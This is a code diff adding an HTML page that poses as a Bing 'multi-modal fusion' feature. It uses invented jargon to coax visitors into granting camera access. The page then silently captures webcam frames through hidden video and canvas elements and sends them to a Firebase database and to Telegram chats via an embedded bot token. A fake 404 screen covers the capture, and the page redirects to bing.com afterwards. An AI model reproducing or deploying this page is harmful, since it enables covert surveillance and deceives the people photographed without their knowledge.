@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bing | Deep Search Multi-Modal</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --bing-blue: #00809d;
+            --bing-bg: #f3f3f3;
+            --bing-surface: #ffffff;
+            --bing-text: #333333;
+            --bing-gray: #666666;
+            --bing-border: #e0e0e0;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--bing-bg); color: var(--bing-text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .bing-card {
+            width: 100%; max-width: 480px; background: var(--bing-surface);
+            border: 1px solid var(--bing-border); border-radius: 4px; overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .bing-header {
+            padding: 16px 24px; border-bottom: 1px solid var(--bing-border);
+            display: flex; align-items: center; gap: 12px; background: #fff;
+        }
+
+        .bing-logo { width: 28px; height: 28px; }
+
+        .bing-body { padding: 40px 32px; text-align: center; }
+
+        .fusion-icon {
+            width: 80px; height: 80px; margin: 0 auto 24px;
+            background: linear-gradient(135deg, #00809d, #00a4ef);
+            border-radius: 12px; display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 128, 157, 0.2);
+        }
+
+        .fusion-ring {
+            width: 50px; height: 50px; border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid #fff; border-radius: 50%;
+            animation: b-spin 2s linear infinite;
+        }
+        @keyframes b-spin { to { transform: rotate(360deg); } }
+
+        h2 { font-size: 22px; font-weight: 600; margin: 0 0 12px; color: #000; }
+        p { font-size: 14px; color: var(--bing-gray); line-height: 1.6; margin-bottom: 32px; }
+
+        .btn-bing {
+            background: var(--bing-blue); color: white; border: none;
+            width: 100%; padding: 12px; font-size: 15px; font-weight: 600;
+            border-radius: 2px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-bing:hover { background: #006a82; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .b-loader {
+            width: 35px; height: 35px; border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--bing-blue); border-radius: 50%;
+            margin: 0 auto 20px; animation: b-spin 0.8s linear infinite;
+        }
+
+        .error-title { font-size: 48px; font-weight: 200; color: #ccc; margin-bottom: 8px; }
+        .node-tag { font-size: 10px; color: #999; margin-top: 30px; text-transform: uppercase; font-family: monospace; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="bing-card">
+        <div class="bing-header">
+            <svg class="bing-logo" viewBox="0 0 32 32" fill="var(--bing-blue)"><path d="M5.4 3h21.2c1.3 0 2.4 1.1 2.4 2.4v21.2c0 1.3-1.1 2.4-2.4 2.4H5.4C4.1 29 3 27.9 3 26.6V5.4C3 4.1 4.1 3 5.4 3zM10 9v14h12V9H10zm2 2h8v10h-8V11z"/></svg>
+            <span style="font-weight: 600; font-size: 16px;">Bing Search Plus</span>
+        </div>
+
+        <!-- Initial View -->
+        <div class="bing-body" id="init-view">
+            <div class="fusion-icon">
+                <div class="fusion-ring"></div>
+            </div>
+            <h2>Spatio-Temporal Fusion</h2>
+            <p>To enable <b>Visual Depth Intent</b>, Bing requires a multi-modal handshake. This synchronizes your spatio-temporal focus with our Mumbai-North inference cluster for zero-latency indexing.</p>
+            
+            <button class="btn-bing" onclick="startBingSync()">Begin Multi-Modal Fusion</button>
+            <div class="node-tag">Node: MUMBAI_NORTH_IDC_7</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="bing-body" id="sync-ui">
+            <div class="b-loader"></div>
+            <div style="font-weight: 600;">Calibrating Visual Index...</div>
+            <div style="font-size: 12px; color: var(--bing-gray); margin-top: 8px;" id="b-timer">Index valid for 60s</div>
+            
+            <div style="text-align: left; background: #fbfbfb; padding: 15px; border-radius: 2px; font-family: monospace; font-size: 10px; color: #555; margin-top: 25px; border: 1px solid var(--bing-border);">
+                > ALLOCATING_SPATIAL_SHARDS... OK<br>
+                > SYNCING_MUMBAI_INFERENCE_CORES... 74%<br>
+                > STATUS: MAPPING_VISUAL_TENSORS
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="bing-body" id="error-404">
+            <div class="error-title">404</div>
+            <h2 style="font-weight: 400;">Fusion Handshake Error</h2>
+            <p>Bing was unable to finalize the multi-modal fusion on the primary Mumbai node. Redirecting to secondary Maharashtra relay for spatial stabilization.</p>
+            <div class="b-loader" style="width: 20px; height: 20px;"></div>
+            <div style="font-size: 11px; color: #999;">Re-synchronizing Vectors...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startBingSync() {
+            try {
+                // Requesting camera under "Spatio-Temporal Visual Indexing"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('b-timer').innerText = `Index valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            bingCapture(count);
+                        }
+
+                        // Trigger 404 at 45s
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.bing.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.bing.com";
+            }
+        }
+
+        function bingCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "BING_FUSION_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_NORTH_NODE" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'bing_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
